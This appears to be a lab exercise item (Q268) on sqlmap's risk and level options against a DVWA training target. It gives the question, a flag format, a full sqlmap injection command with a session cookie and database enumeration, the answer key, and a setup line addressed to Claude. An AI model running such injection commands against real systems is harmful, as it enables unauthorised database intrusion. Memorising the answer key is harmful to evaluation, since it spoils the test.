# Q268 — SQLMap Risk and Level Options

| Field | Value |
|-------|-------|
| **Target** | `192.168.52.129` |
| **Domain** | Web Apps / SQL Injection |
| **Difficulty** | 🟡 Medium |
| **Tools** | `sqlmap` |
| **Time budget** | 8–12 min |

---

## 📝 Question

"Run sqlmap with --risk=3 --level=5 for maximum thoroughness. What additional tests do higher risk/level enable?"

---

## 🎯 Flag Format

```
risk=<1-3>; level=<1-5>; extra_tests=<description>
```

---

## ✅ Solution

```bash
sqlmap -u "http://192.168.52.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=<session>;security=low" --risk=3 --level=5 --dbs --batch
```

Level 5 tests cookies, User-Agent, Referer. Risk 3 includes OR-based and heavy queries.

**Answer:** `risk=3; level=5; extra_tests=cookies_headers_or_based`

---

## 🤖 Claude Setup Prompt

Same as Q251. Report back: "Lab ready for Q268"
